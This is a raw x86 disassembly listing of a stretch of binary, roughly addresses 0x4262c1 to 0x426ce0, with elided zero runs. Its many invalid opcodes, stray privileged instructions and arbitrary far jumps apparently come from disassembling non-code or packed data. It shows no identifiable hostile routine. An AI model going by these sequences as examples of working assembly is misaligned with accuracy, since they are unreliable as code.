  4262c1:	mov    cl,0xcd
  4262c3:	cmc    
  4262c4:	cwde   
  4262c5:	mov    edi,0xc7b44508
  4262ca:	dec    ebp
  4262cb:	std    
  4262cc:	(bad)  
  4262cd:	fwait
  4262ce:	jnp    0x4262c3
  4262d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4262d1:	fwait
  4262d2:	rol    DWORD PTR [edx-0x27],1
  4262d5:	(bad)  
  4262d6:	pop    esi
  4262d7:	add    BYTE PTR [edx],dl
  4262d9:	jge    0x426267
  4262db:	jl     0x4262a5
  4262dd:	in     al,dx
  4262de:	clc    
  4262df:	stos   BYTE PTR es:[edi],al
  4262e0:	mov    ebp,0xfda3cfc6
  4262e5:	push   ebp
  4262e6:	clc    
  4262e7:	rcr    WORD PTR [edi],1
  4262ea:	loope  0x4262b1
  4262ec:	fbstp  TBYTE PTR [edx]
  4262ee:	jg     0x4262d4
  4262f0:	add    al,0x1b
  4262f2:	jne    0x426300
  4262f4:	daa    
  4262f5:	pop    edi
  4262f6:	mov    ah,0xa1
  4262f8:	sub    DWORD PTR [ebp+0x70],ebx
  4262fb:	inc    ebx
  4262fc:	in     eax,dx
  4262fd:	(bad)  
  4262fe:	jecxz  0x426329
  426300:	sub    cl,al
  426302:	fidiv  DWORD PTR fs:[ebx]
  426305:	ret    0xda72
  426308:	push   edx
  426309:	inc    esp
  42630a:	push   edi
  42630b:	into   
  42630c:	jmp    DWORD PTR [ebx+0x36f99d]
	...
  426372:	add    BYTE PTR [eax],al
  426374:	push   esp
  426375:	and    eax,0xeefd4e8d
  42637a:	xlat   BYTE PTR ds:[ebx]
  42637b:	aas    
  42637c:	dec    ecx
  42637d:	sbb    esi,edi
  42637f:	or     eax,0x96536f41
  426384:	stos   DWORD PTR es:[edi],eax
  426385:	cwde   
  426386:	add    DWORD PTR [eax],eax
  426388:	add    eax,0x88000001
  42638d:	xchg   esp,eax
  42638e:	and    ecx,eax
  426390:	icebp  
  426391:	inc    edx
  426392:	lea    edi,[eax+0x5a]
  426395:	lods   eax,DWORD PTR ds:[esi]
  426396:	inc    eax
  426397:	xor    eax,0x6bf8c716
  42639c:	ud1    ebx,DWORD PTR [ebp+0x4a]
  4263a0:	pop    ebp
  4263a1:	clc    
  4263a2:	les    esi,FWORD PTR ds:0xa72f118c
  4263a8:	add    bl,BYTE PTR [ebx-0x7ef4d185]
  4263ae:	hlt    
  4263af:	adc    esi,DWORD PTR [ebp-0x6f]
  4263b2:	xchg   BYTE PTR [eax+0x7e42a085],dh
  4263b8:	pop    eax
  4263b9:	xor    ch,BYTE PTR [edx+0x72fb0cb]
  4263bf:	xchg   ebx,eax
  4263c0:	pushf  
  4263c1:	inc    ecx
  4263c2:	mov    cl,0xc3
  4263c4:	add    esp,ebx
  4263c6:	rol    BYTE PTR [edi-0x4beddbf9],cl
  4263cc:	inc    ebx
  4263cd:	ret    0x3098
  4263d0:	inc    esi
  4263d1:	aad    0xa1
  4263d3:	clc    
  4263d4:	scas   eax,DWORD PTR es:[edi]
  4263d5:	ja     0x426379
  4263d7:	(bad)  
  4263d8:	dec    ecx
  4263d9:	inc    ecx
  4263da:	(bad)  [edx+0x64]
  4263dd:	fstp   st(1)
  4263df:	push   ebx
  4263e0:	push   ds
  4263e1:	aaa    
  4263e2:	mov    WORD PTR [eax+0x14],?
  4263e5:	sbb    cl,BYTE PTR [esi*1+0x47eb12fb]
  4263ec:	add    al,0x73
  4263ee:	adc    al,0x27
  4263f0:	nop
  4263f1:	mov    eax,edx
  4263f3:	push   ecx
  4263f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4263f5:	adc    al,bh
  4263f7:	push   ss
  4263f8:	loopne 0x4263a3
  4263fa:	sub    DWORD PTR [edi-0x6ce2b12d],0xffffff9d
  426401:	lahf   
  426402:	pusha  
  426403:	je     0x4263d8
  426405:	mov    ecx,0xc8a67f59
  42640a:	inc    ebx
  42640b:	jo     0x426457
  42640d:	add    DWORD PTR [eax-0x1b8e8ece],ebx
  426413:	add    cl,ch
  426415:	cwde   
  426416:	xchg   edx,eax
  426417:	xchg   ecx,eax
  426418:	add    BYTE PTR [edi],0x4
  42641b:	push   0x46
  42641d:	shl    DWORD PTR [eax+eax*8],cl
  426420:	pop    ss
  426421:	xchg   ecx,eax
  426422:	dec    edx
  426423:	ret    
  426424:	mov    ah,0x2e
  426426:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426427:	repnz sbb BYTE PTR [esi],cl
  42642a:	sbb    eax,DWORD PTR [ecx+0x45]
  42642d:	fisub  DWORD PTR [edi]
  42642f:	push   ss
  426430:	inc    edx
  426431:	das    
  426432:	jb     0x426486
  426434:	jge    0x4263fa
  426436:	adc    BYTE PTR [eax+0x65688bf0],dh
  42643c:	sbb    al,BYTE PTR [edi]
  42643e:	mov    al,0x20
  426440:	jp     0x426412
  426442:	jp     0x4263ca
  426444:	push   esi
  426445:	lahf   
  426446:	popf   
  426447:	mov    eax,ds:0x66bb6ad3
  42644c:	fld    DWORD PTR [edi-0x72]
  42644f:	(bad)  
  426450:	out    dx,eax
  426451:	aas    
  426452:	inc    esp
  426453:	pop    ds
  426454:	es mov ch,0xa6
  426457:	push   es
  426458:	data16 aam 0xb3
  42645b:	dec    esi
  42645c:	or     esp,eax
  42645e:	pushf  
  42645f:	or     DWORD PTR [esi-0x4e05bb39],ebp
  426465:	sub    di,WORD PTR [edi-0x5326ed]
  42646c:	pusha  
  42646d:	cmp    BYTE PTR [ecx],bl
  42646f:	push   ebx
  426470:	shl    BYTE PTR [edi],0x8d
  426473:	cdq    
  426474:	or     al,0xae
  426476:	div    DWORD PTR [ecx+0xd]
  426479:	test   DWORD PTR [edi+0x631296f2],ebx
  42647f:	retf   0x28a3
  426482:	ds dec ebp
  426484:	sbb    BYTE PTR [edi+0x2b],bh
  426487:	sar    BYTE PTR [ecx+ebp*4],cl
  42648a:	cwde   
  42648b:	jno    0x4264ea
  42648d:	pusha  
  42648e:	xor    DWORD PTR [ecx+ecx*2+0x0],edx
	...
  4264f2:	add    BYTE PTR [eax],al
  4264f4:	imul   ebp,DWORD PTR [edi-0x78],0xe9ef8e08
  4264fb:	outs   dx,DWORD PTR ds:[esi]
  4264fc:	vmwrite ecx,DWORD PTR [edx-0x8cafd7b]
  426503:	repnz mov al,0x99
  426506:	add    DWORD PTR [eax],eax
  426508:	add    eax,0xeb000001
  42650d:	(bad)  
  42650e:	fnsave [esi+0x54]
  426511:	int3   
  426512:	mov    eax,0x41705c0d
  426517:	mov    edx,0x68ac0778
  42651c:	mov    esi,0x32773b15
  426521:	bound  ebx,QWORD PTR [edx-0x48df7d9a]
  426527:	mov    ebp,0xcb00bc48
  42652c:	inc    edi
  42652d:	pusha  
  42652e:	and    DWORD PTR [edi],esp
  426530:	push   edx
  426531:	sub    al,0x54
  426533:	dec    esp
  426534:	inc    eax
  426535:	clc    
  426536:	fcomp  DWORD PTR [eax+edx*1]
  426539:	pop    esp
  42653a:	mov    edi,0x6e5699c8
  42653f:	in     al,0xe4
  426541:	stos   BYTE PTR es:[edi],al
  426542:	gs pop ecx
  426544:	sbb    al,0xb7
  426546:	xor    DWORD PTR [ecx],0xffffff8f
  426549:	mov    edx,0x5c6a0ac1
  42654e:	mov    dl,0xdb
  426550:	lods   al,BYTE PTR ds:[esi]
  426551:	push   ecx
  426552:	push   edi
  426553:	(bad)  
  426554:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426555:	je     0x42659f
  426557:	stc    
  426558:	sbb    esi,ecx
  42655a:	ins    BYTE PTR es:[edi],dx
  42655b:	push   edi
  42655c:	push   ss
  42655d:	lds    esp,FWORD PTR [eax+0x52be9777]
  426563:	lock xchg DWORD PTR [esi-0x6b],ebp
  426567:	dec    esi
  426568:	or     BYTE PTR [ebx+0x6],dl
  42656b:	jecxz  0x4265b9
  42656d:	rol    ebx,0xe1
  426570:	mov    al,0x35
  426572:	sub    cl,BYTE PTR [esi-0x11]
  426575:	nop
  426576:	sbb    ebx,DWORD PTR gs:[ecx+0x59]
  42657a:	aam    0xd3
  42657c:	repz lds edi,FWORD PTR [edi]
  42657f:	test   BYTE PTR [ebp+eiz*4+0x5e5a57f6],cl
  426586:	push   edx
  426587:	cwde   
  426588:	out    0x63,eax
  42658a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42658b:	add    BYTE PTR [ebp+0x43dc34a2],ah
  426591:	pop    esp
  426592:	mov    ds:0x8e70df6a,eax
  426597:	fidivr DWORD PTR [esi+ebp*8+0x44]
  42659b:	fmul   DWORD PTR [esi]
  42659d:	push   ebp
  42659e:	loop   0x426601
  4265a0:	rcr    ecx,cl
  4265a2:	ss lahf 
  4265a4:	pop    esp
  4265a5:	(bad)  
  4265a6:	fcompp 
  4265a8:	ds or  eax,0x8e2420c5
  4265ae:	dec    eax
  4265af:	lahf   
  4265b0:	jmp    0xccadc64d
  4265b5:	fwait
  4265b6:	or     al,0x26
  4265b8:	stc    
  4265b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4265ba:	xchg   esp,ebp
  4265bc:	cmp    DWORD PTR [edi+0x68dd24cf],edx
  4265c2:	cmc    
  4265c3:	and    BYTE PTR [esi+0x42d59656],bh
  4265c9:	add    al,0x2b
  4265cb:	gs test al,0x7d
  4265ce:	lock int 0xb3
  4265d1:	sub    BYTE PTR [edx-0x2c418f38],dh
  4265d7:	cmp    eax,0x6c3cef34
  4265dc:	stos   DWORD PTR es:[edi],eax
  4265dd:	mov    ds:0x2fb04f8a,al
  4265e2:	retf   0x82e4
  4265e5:	ss inc ecx
  4265e7:	rcr    DWORD PTR [eax+eiz*2+0x3d],0x4d
  4265ec:	mov    edx,0xc9b7b54d
  4265f1:	xchg   ebx,eax
  4265f2:	jo     0x42658a
  4265f4:	sahf   
  4265f5:	fistp  WORD PTR [ebx+0x2bdc59dd]
  4265fb:	and    dl,dh
  4265fd:	jle    0x4265b5
  4265ff:	add    DWORD PTR [edi],edi
  426601:	xchg   edx,eax
  426602:	(bad)  
  426603:	call   ebx
  426605:	or     DWORD PTR [edx],ebp
  426607:	sbb    DWORD PTR [eax+eiz*8],edi
  42660a:	(bad)  [esi+0x56238206]
  426610:	adc    al,BYTE PTR [eax]
	...
  426672:	add    BYTE PTR [eax],al
  426674:	adc    cl,bl
  426676:	sbb    DWORD PTR [edx],0xcb9b5ad9
  42667c:	pop    DWORD PTR [edi-0x4240925c]
  426682:	pop    edx
  426683:	jg     0x42663a
  426685:	call   0x0:0x1050001
  42668c:	push   esp
  42668d:	sbb    eax,DWORD PTR [edi+0x37ea940]
  426693:	ret    
  426694:	fimul  WORD PTR [eax+esi*2]
  426697:	retf   
  426698:	cli    
  426699:	xor    ebx,ebx
  42669b:	mov    edx,0x2df1a25c
  4266a0:	dec    ecx
  4266a1:	dec    edx
  4266a2:	xchg   esi,eax
  4266a3:	push   esi
  4266a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4266a5:	in     al,dx
  4266a6:	adc    BYTE PTR [ebx-0x17efe893],0xf6
  4266ad:	in     al,0xe7
  4266af:	inc    esi
  4266b0:	lods   eax,DWORD PTR ds:[esi]
  4266b1:	into   
  4266b2:	test   al,0xf8
  4266b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4266b5:	cmp    BYTE PTR [esp+eax*1+0x39fd7f17],al
  4266bc:	popf   
  4266bd:	pop    edi
  4266be:	fchs   
  4266c0:	jb     0x426705
  4266c2:	ja     0x4266c5
  4266c4:	arpl   sp,cx
  4266c6:	or     dh,ah
  4266c8:	rol    BYTE PTR [edx-0x46],cl
  4266cb:	in     al,0x8a
  4266cd:	repnz cmp al,BYTE PTR [esi+0x31]
  4266d1:	jecxz  0x4266e7
  4266d3:	or     DWORD PTR [edi+edi*8],edx
  4266d6:	jmp    0xd8f115f0
  4266db:	pop    eax
  4266dc:	outs   dx,DWORD PTR ds:[esi]
  4266dd:	or     edx,esp
  4266df:	lahf   
  4266e0:	into   
  4266e1:	rcr    BYTE PTR [edx-0x2a725030],cl
  4266e7:	fiadd  WORD PTR [edx-0x5c73d4ed]
  4266ed:	mov    ecx,0x1946ae7e
  4266f2:	sub    al,0x4f
  4266f4:	xlat   BYTE PTR ds:[ebx]
  4266f5:	pop    ds
  4266f6:	retf   0xefc5
  4266f9:	sbb    eax,0x3f013c0d
  4266fe:	inc    esi
  4266ff:	and    BYTE PTR [eax],al
  426701:	push   ecx
  426702:	dec    esp
  426703:	push   esp
  426704:	push   esp
  426705:	pushf  
  426706:	repz inc ebx
  426708:	retf   
  426709:	(bad)  
  42670a:	xor    dl,dh
  42670c:	cmp    bh,BYTE PTR [edx+0x34]
  42670f:	add    al,0x17
  426711:	adc    eax,0x3233443c
  426716:	mov    eax,ds:0x28095a9b
  42671b:	dec    esp
  42671c:	ja     0x42671e
  42671e:	add    eax,0x46b21134
  426723:	(bad)  
  426725:	and    DWORD PTR [edi],ecx
  426727:	jnp    0x42675b
  426729:	and    bh,BYTE PTR [ebp-0x2b572f25]
  42672f:	jmp    0x5c69:0x725006e
  426736:	add    BYTE PTR [ecx],0x7d
  426739:	ror    DWORD PTR [edx+0x28],cl
  42673c:	fs push esi
  42673e:	add    eax,DWORD PTR [eax]
  426740:	and    bh,BYTE PTR [esi]
  426742:	sbb    DWORD PTR [eax-0x678c7e39],ebp
  426748:	pop    esp
  426749:	xchg   ebx,eax
  42674a:	(bad)  
  42674b:	pop    ss
  42674c:	jae    0x4266d5
  42674e:	repnz sahf 
  426750:	inc    esp
  426751:	bound  edx,QWORD PTR ds:0x6d364eaf
  426757:	std    
  426758:	pop    ss
  426759:	and    al,0x14
  42675b:	mov    bh,BYTE PTR [edi+0x7aa48d77]
  426761:	adc    eax,0x4e510ee5
  426766:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426767:	icebp  
  426768:	sub    ebp,ebp
  42676a:	pop    ss
  42676b:	dec    ebp
  42676c:	mov    ebx,ebp
  42676e:	inc    ebx
  42676f:	push   edi
  426770:	push   ss
  426771:	push   cs
  426772:	dec    ecx
  426773:	call   0xfa5e:0xd2494995
  42677a:	cmp    al,0xc0
  42677c:	add    edi,edx
  42677e:	xchg   ecx,eax
  42677f:	mov    cl,0x3a
  426781:	out    dx,al
  426782:	dec    ebp
  426783:	(bad)  
  426784:	cld    
  426785:	scas   eax,DWORD PTR es:[edi]
  426786:	pop    ss
  426787:	stc    
  426788:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426789:	popf   
  42678a:	jmp    0x8e5a:0xf7740b58
	...
  4267f1:	add    BYTE PTR [eax],al
  4267f3:	add    BYTE PTR [eax-0xd53173],bh
  4267f9:	imul   edi,esp,0xffffff9f
  4267fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4267fd:	and    dh,0xca
  426800:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426801:	sti    
  426802:	popa   
  426803:	push   esi
  426804:	mov    edx,0x500019b
  426809:	add    DWORD PTR [eax],eax
  42680b:	add    ah,dh
  42680d:	ja     0x426825
  42680f:	(bad)  
  426810:	fld    TBYTE PTR [eax]
  426812:	jle    0x426842
  426814:	pop    ebp
  426815:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426816:	std    
  426817:	push   edx
  426818:	call   0x514a:0x65b1c7ac
  42681f:	push   esi
  426820:	(bad)  
  426821:	jp     0x4267a3
  426823:	adc    ch,bl
  426825:	pushf  
  426826:	(bad)  
  426827:	push   edx
  426828:	mov    esp,ecx
  42682a:	mov    cl,0x4d
  42682c:	clc    
  42682d:	inc    ebx
  42682e:	and    DWORD PTR [eax+0x40],eax
  426831:	or     al,BYTE PTR [ecx+0x46]
  426834:	inc    edx
  426835:	cmp    al,0x9f
  426837:	out    0x46,eax
  426839:	js     0x42689b
  42683b:	mov    eax,ds:0xef5ed22b
  426840:	ins    DWORD PTR es:[edi],dx
  426841:	mov    bl,BYTE PTR [ecx-0x34]
  426844:	inc    ebx
  426845:	gs out dx,eax
  426847:	cmp    al,0x8c
  426849:	xchg   edi,eax
  42684a:	stos   DWORD PTR es:[edi],eax
  42684b:	lock dec edi
  42684d:	mov    ah,0x86
  42684f:	add    ah,cl
  426851:	mov    BYTE PTR [ebp+0xd],bh
  426854:	mov    bp,0x62ae
  426858:	pop    ecx
  426859:	out    0xa9,al
  42685b:	mov    al,ds:0x224e1bc1
  426860:	mov    ss:0x1b057268,eax
  426866:	jne    0x4268c3
  426868:	pop    es
  426869:	or     al,0xf1
  42686b:	or     eax,0x67679aed
  426870:	dec    ebx
  426871:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426872:	lahf   
  426873:	push   esp
  426874:	mov    edx,esp
  426876:	ss retf 0xea3a
  42687a:	ds cmp edx,edx
  42687d:	mov    bh,BYTE PTR [eax+0x51]
  426880:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426881:	add    al,0x3a
  426883:	sub    eax,0x4e44f7a5
  426888:	int    0x9b
  42688a:	pop    ecx
  42688b:	loopne 0x426823
  42688d:	push   0xffffffaa
  42688f:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  426891:	sahf   
  426892:	fadd   QWORD PTR [ecx-0x50]
  426895:	fwait
  426896:	inc    ebx
  426897:	out    dx,al
  426898:	push   0x60cdb2d9
  42689d:	and    DWORD PTR [esi+0x22],eax
  4268a0:	jmp    0xea2f0b02
  4268a5:	mov    edx,0x3a679ab0
  4268aa:	xor    dl,cl
  4268ac:	fnstenv [ebx]
  4268ae:	gs mov eax,0x58cccc0e
  4268b4:	xchg   ecx,eax
  4268b5:	cmp    esp,DWORD PTR [edx+edi*8+0x4f]
  4268b9:	dec    ecx
  4268ba:	(bad)  
  4268bb:	cli    
  4268bc:	mov    eax,ds:0x568db5d7
  4268c1:	sbb    BYTE PTR [ebp+0x20],0x58
  4268c5:	mov    eax,0x8dd3e94b
  4268ca:	or     ecx,DWORD PTR [esi+eax*8+0x1e]
  4268ce:	push   ecx
  4268cf:	loopne 0x4268ff
  4268d1:	mov    ah,0x2f
  4268d3:	ins    BYTE PTR es:[edi],dx
  4268d4:	pop    ebp
  4268d5:	dec    edx
  4268d6:	test   eax,0x197e7f91
  4268db:	jge    0x426896
  4268dd:	rcr    DWORD PTR [edx+0x32],1
  4268e0:	dec    edi
  4268e1:	mov    eax,ds:0x5de01de5
  4268e6:	in     eax,dx
  4268e7:	adc    eax,0xc76b9159
  4268ec:	fwait
  4268ed:	xchg   esp,eax
  4268ee:	(bad)  
  4268f0:	sbb    bh,BYTE PTR [ecx+eiz*8-0x3633a9d1]
  4268f7:	mov    cl,0x84
  4268f9:	mov    esi,0x6da34e68
  4268fe:	iret   
  4268ff:	xchg   ebp,eax
  426900:	outs   dx,BYTE PTR ds:[esi]
  426901:	and    eax,DWORD PTR [ebx+0xf]
  426904:	or     DWORD PTR [eax+ebx*8],ebp
  426907:	sbb    DWORD PTR [ecx],0x35f71ecf
  42690d:	bound  esp,QWORD PTR [edi+0xec39]
	...
  426973:	add    BYTE PTR [esi+ecx*2+0x7fff7d7d],cl
  42697a:	mov    edi,?
  42697c:	sub    ebp,esp
  42697e:	lahf   
  42697f:	mov    ebx,DWORD PTR [eax]
  426981:	xchg   esp,eax
  426982:	inc    edi
  426983:	(bad)  
  426984:	mov    edi,0x500019c
  426989:	add    DWORD PTR [eax],eax
  42698b:	add    dh,bh
  42698d:	aam    0xaf
  42698f:	jbe    0x426953
  426991:	xchg   esi,eax
  426992:	in     al,0xa0
  426994:	ins    DWORD PTR es:[edi],dx
  426995:	pop    es
  426996:	sbb    DWORD PTR [eax],0xffffffee
  426999:	leave  
  42699a:	push   esi
  42699b:	mov    al,0x64
  42699d:	sbb    eax,0x60c1ddaa
  4269a2:	ret    0x682d
  4269a5:	fisub  WORD PTR [edx-0x3d]
  4269a8:	(bad)  
  4269a9:	mov    ebp,0xa90a06bb
  4269ae:	jmp    0x426a02
  4269b0:	push   edx
  4269b1:	stos   DWORD PTR es:[edi],eax
  4269b2:	addr16 leave 
  4269b4:	mov    al,0x35
  4269b6:	mov    WORD PTR [eax],cs
  4269b8:	pop    edx
  4269b9:	jno    0x426995
  4269bb:	xchg   esi,eax
  4269bc:	add    ebx,DWORD PTR [ecx]
  4269be:	jns    0x4269d4
  4269c0:	in     eax,0x0
  4269c2:	(bad)
  4269c6:	cmp    ah,BYTE PTR [ecx+0x54]
  4269c9:	aaa    
  4269ca:	call   0x606a:0xe5894627
  4269d1:	mov    ebx,DWORD PTR [edi-0x71]
  4269d4:	ins    BYTE PTR es:[edi],dx
  4269d5:	mov    BYTE PTR cs:[esi+eiz*1-0x50],bh
  4269da:	jns    0x4269b5
  4269dc:	in     al,dx
  4269dd:	lahf   
  4269de:	popa   
  4269df:	arpl   WORD PTR [edx+0x51],dx
  4269e2:	xor    eax,0x93482503
  4269e7:	shl    DWORD PTR [ecx-0x10],cl
  4269ea:	loope  0x4269a5
  4269ec:	das    
  4269ed:	add    eax,0xb672a03d
  4269f2:	iret   
  4269f3:	pop    eax
  4269f4:	dec    ebp
  4269f5:	addr16 mov al,0xa
  4269f8:	(bad)  
  4269f9:	ror    BYTE PTR [ecx],cl
  4269fb:	sub    DWORD PTR [eax],edi
  4269fd:	retf   0xe6dd
  426a00:	es push es
  426a02:	(bad)  
  426a03:	ror    DWORD PTR [edi+0x65],cl
  426a06:	dec    ebx
  426a07:	out    0xb1,al
  426a09:	sub    edi,DWORD PTR [eax+0x38]
  426a0c:	jmp    0xe94f3603
  426a11:	dec    esp
  426a12:	inc    ebp
  426a13:	or     ch,dh
  426a15:	inc    eax
  426a16:	or     al,0x43
  426a18:	pop    ss
  426a19:	sbb    bl,dh
  426a1b:	ds mov ebp,ebx
  426a1e:	jecxz  0x4269a9
  426a20:	leave  
  426a21:	xor    DWORD PTR [eax],0xffffffe8
  426a24:	xchg   esp,eax
  426a25:	(bad)  
  426a26:	retf   
  426a27:	dec    ecx
  426a28:	loop   0x426a3e
  426a2a:	xor    eax,0x26421ee6
  426a2f:	fidivr DWORD PTR [edi-0x40f44e80]
  426a35:	call   0x88504bb3
  426a3a:	test   BYTE PTR [edx-0x53662868],bl
  426a40:	popf   
  426a41:	arpl   bp,dx
  426a43:	xchg   esi,eax
  426a44:	xchg   edx,eax
  426a45:	xor    al,0xbb
  426a47:	mov    esp,0xaf8b7c3b
  426a4c:	mov    es,WORD PTR [esi-0x79bda630]
  426a52:	leave  
  426a53:	mov    cl,0xaa
  426a55:	xchg   ebp,eax
  426a56:	dec    eax
  426a57:	push   edx
  426a58:	out    dx,al
  426a59:	dec    ebp
  426a5a:	xlat   BYTE PTR ds:[ebx]
  426a5b:	or     al,BYTE PTR [ebx-0xd65d9c7]
  426a61:	neg    BYTE PTR [ebx]
  426a63:	inc    ebx
  426a64:	jno    0x426a8a
  426a66:	bound  esp,QWORD PTR [edx+0x4f2611cd]
  426a6c:	int    0x86
  426a6e:	lods   eax,DWORD PTR ds:[esi]
  426a6f:	out    0x99,al
  426a71:	addr16 inc ecx
  426a73:	sub    cl,al
  426a75:	xor    eax,DWORD PTR [ebx]
  426a77:	std    
  426a78:	and    eax,eax
  426a7a:	push   es
  426a7b:	mov    eax,0xa551aca
  426a80:	and    eax,0x6bc8c8fd
  426a85:	mov    WORD PTR [edi-0x2162818b],?
  426a8b:	jnp    0x426acd
  426a8d:	and    al,0xb
  426a8f:	stc    
  426a90:	rol    BYTE PTR [eax],1
	...
  426af2:	add    BYTE PTR [eax],al
  426af4:	cdq    
  426af5:	sub    BYTE PTR ds:0xdb77bd56,cl
  426afb:	out    dx,eax
  426afc:	inc    esi
  426afd:	sub    DWORD PTR [esi],edi
  426aff:	or     al,0x14
  426b01:	inc    edx
  426b02:	xchg   ebx,eax
  426b03:	aas    
  426b04:	les    ebx,FWORD PTR [ebp+0x1050001]
  426b0a:	add    BYTE PTR [eax],al
  426b0c:	pop    esp
  426b0d:	jo     0x426ab7
  426b0f:	inc    esp
  426b10:	es je  0x426b91
  426b13:	push   edx
  426b14:	add    al,0x39
  426b16:	fstp   QWORD PTR [edi-0x53]
  426b19:	das    
  426b1a:	into   
  426b1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426b1c:	add    ah,BYTE PTR [ecx]
  426b1e:	and    DWORD PTR [edx],esi
  426b20:	xor    al,0xe0
  426b22:	popf   
  426b23:	or     DWORD PTR [edi+0x0],0x597379f0
  426b2a:	in     eax,dx
  426b2b:	add    eax,0xa227d88d
  426b30:	adc    DWORD PTR [esi],ecx
  426b32:	addr16 leave 
  426b34:	aas    
  426b35:	push   eax
  426b36:	mov    dh,BYTE PTR [edx+0x7b]
  426b39:	popa   
  426b3a:	retf   
  426b3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426b3c:	sub    al,0x2a
  426b3e:	xchg   esp,eax
  426b3f:	or     BYTE PTR [edx+0x7e],ch
  426b42:	xor    BYTE PTR [esp+edi*8],bh
  426b45:	popa   
  426b46:	popf   
  426b47:	add    eax,0x229e65f6
  426b4c:	ret    0xb83b
  426b4f:	sub    ebx,esi
  426b51:	nop
  426b52:	and    al,0x2
  426b54:	add    cl,BYTE PTR [edx]
  426b56:	mov    esi,0xdde55fc2
  426b5b:	and    eax,0x35e76db9
  426b60:	lds    edi,FWORD PTR [edi+ebp*4-0x25a9a703]
  426b67:	adc    dl,BYTE PTR [edi-0x7d6ce44b]
  426b6d:	mov    ebx,0x14f19185
  426b72:	xor    BYTE PTR [ecx+eax*4+0x3e720303],al
  426b79:	clc    
  426b7a:	dec    edx
  426b7b:	pop    esi
  426b7c:	pop    edx
  426b7d:	xor    DWORD PTR [eax],esp
  426b7f:	pop    ebx
  426b80:	add    al,0xf3
  426b82:	fdivrp st(6),st
  426b84:	scas   al,BYTE PTR es:[edi]
  426b85:	pop    ecx
  426b86:	pop    esp
  426b87:	test   al,0x5
  426b89:	xchg   edx,eax
  426b8a:	arpl   WORD PTR ds:0x792700cf,ax
  426b90:	lods   al,BYTE PTR ds:[esi]
  426b91:	cmp    eax,0xaaa816db
  426b96:	push   edi
  426b97:	nop
  426b98:	cli    
  426b99:	aam    0xbb
  426b9b:	mov    cl,0x5a
  426b9d:	test   BYTE PTR [ebx+0x6e],dh
  426ba0:	mov    ds:0xf355d7cd,eax
  426ba5:	sti    
  426ba6:	or     al,0x23
  426ba8:	mul    BYTE PTR [ebx+0x13]
  426bab:	jl     0x426b6f
  426bad:	cmp    bl,BYTE PTR [edx+0x12]
  426bb0:	sbb    ebx,DWORD PTR [edi-0x6b580eb7]
  426bb6:	inc    ebx
  426bb7:	iret   
  426bb8:	mov    bl,BYTE PTR [ecx-0x6112918]
  426bbe:	dec    edi
  426bbf:	loop   0x426b8f
  426bc1:	cmp    bl,BYTE PTR [edi+0x27d0b409]
  426bc7:	loopne 0x426b92
  426bc9:	pop    ebx
  426bca:	xchg   ecx,eax
  426bcb:	mov    edi,0xcbfcd60d
  426bd0:	aad    0x0
  426bd2:	sbb    BYTE PTR [edx],0x2e
  426bd5:	mov    ds,WORD PTR [esi]
  426bd7:	push   esi
  426bd8:	cmp    eax,0x6f7a47ba
  426bdd:	push   0xfffffffc
  426bdf:	ror    dl,0xc3
  426be2:	pop    edi
  426be3:	and    al,BYTE PTR [ecx]
  426be5:	mov    edi,0x8744b383
  426bea:	cmc    
  426beb:	fbld   TBYTE PTR [ecx]
  426bed:	xor    cl,cl
  426bef:	test   eax,0xbfe0fd53
  426bf4:	sub    esi,ebp
  426bf6:	inc    esi
  426bf7:	push   eax
  426bf8:	(bad)
  426bfb:	mov    WORD PTR [edi-0x3377d6cf],gs
  426c01:	repnz inc ebx
  426c03:	cs call 0xdba7b530
  426c09:	mov    bl,0x6b
  426c0b:	sahf   
  426c0c:	cwde   
  426c0d:	xor    eax,0x4a0360
	...
  426c72:	add    BYTE PTR [eax],al
  426c74:	loop   0x426cd6
  426c76:	test   DWORD PTR [esi+0x74f3f787],esi
  426c7c:	mov    ah,0xeb
  426c7e:	cld    
  426c7f:	mov    edx,0x29f060bc
  426c84:	leave  
  426c85:	sahf   
  426c86:	add    DWORD PTR [eax],eax
  426c88:	add    eax,0xfe000001
  426c8d:	adc    DWORD PTR [eax+0x1d374bbe],eax
  426c93:	mov    esp,eax
  426c95:	xor    ecx,DWORD PTR [edi]
  426c97:	push   edi
  426c98:	push   eax
  426c99:	shl    eax,1
  426c9b:	sbb    DWORD PTR [ecx],ebp
  426c9d:	ror    eax,1
  426c9f:	jno    0x426c90
  426ca1:	mov    ah,0xe9
  426ca3:	and    eax,0x2591d16f
  426ca8:	sub    BYTE PTR [esi-0x62],bh
  426cab:	sti    
  426cac:	sbb    edi,DWORD PTR [edx-0x27]
  426caf:	dec    ebp
  426cb0:	js     0x426c82
  426cb2:	jbe    0x426ce8
  426cb4:	call   0xab61:0x686e862d
  426cbb:	mov    dh,0x99
  426cbd:	add    DWORD PTR [esi-0x21],edx
  426cc0:	and    bh,BYTE PTR [esi-0x50]
  426cc3:	inc    esi
  426cc4:	inc    esp
  426cc5:	mov    ch,0x0
  426cc7:	jmp    0x426c5b
  426cc9:	cwde   
  426cca:	mov    eax,0x25101732
  426ccf:	jle    0x426caa
  426cd1:	stos   DWORD PTR es:[edi],eax
  426cd2:	cmp    ah,BYTE PTR [edi-0x4f]
  426cd5:	jne    0x426d17
  426cd7:	pop    edx
  426cd8:	dec    edi
  426cd9:	xchg   DWORD PTR [edx+0x12],esi
  426cdc:	or     ebx,DWORD PTR [ebx]
  426cde:	jno    0x426cdc
  426ce0:	mov    eax,ds:0x2ee961d
